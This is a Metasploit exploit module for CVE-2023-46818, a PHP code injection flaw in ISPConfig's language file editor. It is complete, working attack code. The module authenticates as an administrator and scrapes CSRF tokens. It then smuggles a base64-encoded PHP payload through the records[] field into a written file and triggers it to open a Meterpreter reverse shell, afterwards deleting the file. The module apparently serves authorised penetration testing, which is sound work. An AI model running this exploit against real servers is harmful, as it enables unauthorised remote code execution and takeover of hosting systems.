##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ISPConfig language_edit.php PHP Code Injection',
        'Description' => %q{
          An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'syfi', # Discovery and PoC
          'Egidio Romano'
        ],
        'References' => [
          ['CVE', '2023-46818'],
          ['URL', 'https://github.com/SyFi/CVE-2023-46818'],
          ['URL', 'https://karmainsecurity.com/KIS-2023-13'],
          ['URL', 'https://karmainsecurity.com/pocs/CVE-2023-46818.php']
        ],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [
          [
            'Automatic PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => '2023-10-24',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'php/meterpreter/reverse_tcp'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The URI path to ISPConfig', '/']),
      OptString.new('USERNAME', [true, 'ISPConfig administrator username']),
      OptString.new('PASSWORD', [true, 'ISPConfig administrator password'])
    ])
  end

  def check
    print_status('Checking if the target is ISPConfig...')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return CheckCode::Unknown unless res

    # Try to log in and parse version if credentials are provided
    if datastore['USERNAME'] && datastore['PASSWORD']
      login_res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'login'),
        'vars_post' => {
          'username' => datastore['USERNAME'],
          'password' => datastore['PASSWORD'],
          's_mod' => 'login'
        },
        'keep_cookies' => true
      })
      if login_res && (login_res.headers['Location']&.include?('admin') || login_res.body.downcase.include?('dashboard'))
        # Try to access the dashboard or settings page
        settings_res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'admin', 'index.php'),
          'keep_cookies' => true
        })
        if settings_res
          doc = settings_res.get_html_document
          # Try to find version in a span, div, or similar element
          version_text = doc.text[/ISPConfig\s*v?(\d+\.\d+(?:\.\d+)?(?:p\d+)?)/i, 1]
          if version_text
            print_good("ISPConfig version detected: #{version_text}")
            return CheckCode::Appears("Version: #{version_text}")
          end
        end
      end
    end

    # Fallback to the previous check
    if res.body.include?('ISPConfig') && (res.body.include?('login') || res.body.include?('username') || res.body.include?('password'))
      print_good('ISPConfig installation detected')
      return CheckCode::Detected
    end
    CheckCode::Safe
  end

  def authenticate
    print_status("Attempting login with username '#{datastore['USERNAME']}' and password '#{datastore['PASSWORD']}'")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        's_mod' => 'login'
      },
      'keep_cookies' => true
    })
    fail_with(Failure::NoAccess, 'Login request failed') unless res
    if res&.code == 302
      res = send_request_cgi({
        'method' => 'GET',
         'uri' => normalize_uri(target_uri.path, 'login/',res&.headers.fetch('Location',nil))
      })
    end
    if res.body.match(/Username or Password wrong/i)
      fail_with(Failure::NoAccess, 'Login failed: Invalid credentials')
    end
    if res.headers.fetch('Location',nil)&.include?('admin') ||
       res.body.downcase.include?('dashboard')
      print_good('Login successful!')
      return true
    end
    print_warning('Login status unclear, attempting to continue...')
    true
  end

  def inject_payload
    print_status('Injecting PHP payload...')
    @payload_file = "#{Rex::Text.rand_text_alpha_lower(8)}.php"
    b64_payload = Base64.strict_encode64(payload.encoded)
    injection = "'];file_put_contents('#{@payload_file}',base64_decode('#{b64_payload}'));die;#"
    lang_file = Rex::Text.rand_text_alpha_lower(10) + ".lng"
    edit_url = normalize_uri(target_uri.path, 'admin', 'language_edit.php')
    initial_data = {
      'lang' => 'en',
      'module' => 'help',
      'lang_file' => lang_file
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => edit_url,
      'vars_post' => initial_data,
      'keep_cookies' => true
    })
    fail_with(Failure::UnexpectedReply, 'Unable to access language_edit.php') unless res
    doc = res.get_html_document
    csrf_id = doc.at('input[name="_csrf_id"]')&.[]('value')
    csrf_key = doc.at('input[name="_csrf_key"]')&.[]('value')
    unless csrf_id && csrf_key
      fail_with(Failure::UnexpectedReply, 'CSRF tokens not found!')
    end
    print_good("Extracted CSRF tokens: ID=#{csrf_id[0..10]}..., KEY=#{csrf_key[0..10]}...")
    injection_data = {
      'lang' => 'en',
      'module' => 'help',
      'lang_file' => lang_file,
      '_csrf_id' => csrf_id,
      '_csrf_key' => csrf_key,
      'records[\]' => injection
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => edit_url,
      'vars_post' => injection_data,
      'keep_cookies' => true
    })
    fail_with(Failure::UnexpectedReply, 'Injection request failed') unless res
    payload_url = normalize_uri(target_uri.path, 'admin', @payload_file)
    print_good("Payload successfully injected: #{@payload_file}")
    return payload_url
  end

  def trigger_payload(payload_url)
    print_status('Triggering PHP payload...')
    # Small delay to ensure the file is written
    sleep(1)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => payload_url,
      'keep_cookies' => true
    })
    if res&.code == 200
      print_good('PHP payload triggered successfully')
    else
      print_warning('Payload trigger response was unexpected')
    end
  end

  def cleanup
    return unless @payload_file
    print_status('Cleaning up payload file...')
    # Use the same vulnerability to delete the file
    injection = "'];unlink('#{@payload_file}');die;#"
    lang_file = Rex::Text.rand_text_alpha_lower(10) + ".lng"
    edit_url = normalize_uri(target_uri.path, 'admin', 'language_edit.php')
    initial_data = {
      'lang' => 'en',
      'module' => 'help',
      'lang_file' => lang_file
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => edit_url,
      'vars_post' => initial_data,
      'keep_cookies' => true
    })
    return unless res
    doc = res.get_html_document
    csrf_id = doc.at('input[name="_csrf_id"]')&.[]('value')
    csrf_key = doc.at('input[name="_csrf_key"]')&.[]('value')
    return unless csrf_id && csrf_key
    injection_data = {
      'lang' => 'en',
      'module' => 'help',
      'lang_file' => lang_file,
      '_csrf_id' => csrf_id,
      '_csrf_key' => csrf_key,
      'records[\\]' => injection
    }
    send_request_cgi({
      'method' => 'POST',
      'uri' => edit_url,
      'vars_post' => injection_data,
      'keep_cookies' => true
    })
    print_good("Payload file #{@payload_file} cleaned up")
  end

  def exploit
    authenticate
    payload_url = inject_payload
    print_status('Starting payload handler...')
    trigger_payload(payload_url)
    print_status('Manual trigger information:')
    print_line("URL: #{full_uri}#{payload_url}")
    print_line("Manual trigger: curl '#{full_uri}#{payload_url}'")
  end
end 